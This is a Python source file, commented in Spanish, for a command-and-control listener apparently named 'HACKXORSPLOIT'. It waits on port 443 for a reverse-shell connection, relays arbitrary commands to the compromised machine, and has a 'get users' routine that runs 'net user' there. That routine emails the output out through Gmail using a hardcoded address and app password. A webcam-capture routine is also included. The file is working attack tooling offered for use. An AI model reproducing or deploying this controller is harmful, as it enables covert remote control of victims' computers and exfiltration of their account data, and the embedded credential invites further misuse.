#!/usr/bin/env python3
import socket
import signal
import time
import sys
import cv2
from colorama import Fore, Style
from email.mime.text import MIMEText
import smtplib

def def_handler(sig, frame):
    print(f'\n [!] Saliendo...\n')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:
    
    # Aceptar conexion y establecerla
    def __init__(self, ip, port):

        self.options = {'get users':'List system valid users (Gmail)','get photo':'Take a photo','help':'Show this help panel'}
    
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print(f'\n[+] En modo escucha a la conexion...')
    
        self.client_socket, client_address = server_socket.accept()

        print(f'\n[+] Conexion establecida en : {client_address}\n')

    # Funcion para recibir las instrucciones
    def execute_remotely(self, comando):
        self.client_socket.send(comando.encode())
        return  self.client_socket.recv(1024).decode()

    # Funcion para retornar la lista de ayuda
    def show_help(self):
        for key, value in self.options.items():
            print(f'{key} - {value}\n')
           

    # Funcion para usar gmail como receptor
    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f'[+] Email enviado exitosamente !')


    # Aqui van las funciones automatizadas, puedes agregar a como te convenga...
    def get_users(self):
        self.client_socket.send(b'net user')
        comando_salida = self.client_socket.recv(2048).decode()
        self.send_email('User List Info - C2', comando_salida, 'hackxorsploit@gmail.com', ['hackxorsploit@gmail.com'], 'ymrf pero nryg ahoi')

    def get_photo(self):
        cap = cv2.VideoCapture(0)
        time.sleep(1)
        ret, frame = cap.read()
        cv2.imwrite('Foto.jpg', frame)
        print(f'[+] Foto tomada con exito !\n')
        cap.release()
        cv2.destroyAllWindows()

    def run(self):
        while True:
            comando = input('>> ')
            if comando == "get users":
                self.get_users()
            elif comando == "help":
                self.show_help()
            elif comando == "get photo":
                self.get_photo()
            else:
                comando_salida = self.execute_remotely(comando)
                print(comando_salida)

if __name__ == '__main__':
    time.sleep(1)
    banner = """

 _   _    _    ____ _____ _  _ ___  ____  ____  ____ ___    ___ ___ _____ 
| | | |  / \  / ___| |/ /\ \/ / _ \|  _ \/ ___||  _ \| |   / _ \_ _|_   _|
| |_| | / _ \| |   | ' /  \  / | | | |_) \___ \| |_) | |  | | | | |  | |  
|  _  |/ ___ \ |___| . \  /  \ |_| |  _ < ___) |  __/| |__| |_| | |  | |  
|_| |_/_/   \_\____|_|\_\/_/\_\___/|_| \_\____/|_|   |_____\___/___| |_|         

                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣴⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                     ⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⠿⠛⠋⠉⠁⠀⠀⠀⠈⠙⠻⢷⣦⡀⠀⠀⠀⠀⠀⠀
                     ⠀⠀⠀⠀⠀⣤⣾⡿⠋⠁⠀⣠⣶⣿⡿⢿⣷⣦⡀⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀
                     ⠀⠀⢀⣴⣿⡿⠋⠀⠀⢀⣼⣿⣿⣿⣶⣿⣾⣽⣿⡆⠀⠀⠀⠀⢻⣿⣷⣶⣄⠀
                     ⠀⣴⣿⣿⠋⠀⠀⠀⠀⠸⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⠀⠀⠀⠐⡄⡌⢻⣿⣿⡷
                     ⢸⣿⣿⠃⢂⡋⠄⠀⠀⠀⢿⣿⣿⣿⣿⣿⣯⣿⣿⠏⠀⠀⠀⠀⢦⣷⣿⠿⠛⠁
                     ⠀⠙⠿⢾⣤⡈⠙⠂⢤⢀⠀⠙⠿⢿⣿⣿⡿⠟⠁⠀⣀⣀⣤⣶⠟⠋⠁⠀⠀⠀
                     ⠀⠀⠀⠀⠈⠙⠿⣾⣠⣆⣅⣀⣠⣄⣤⣴⣶⣾⣽⢿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀
                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠙⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    banner_coloreado = f'{Fore.RED}{banner}{Style.RESET_ALL}'
    print(banner_coloreado)

    ip= input('\n [+] Ingresa tu direccion ip local => ')
    my_listener = Listener(ip, 443)
    my_listener.run()
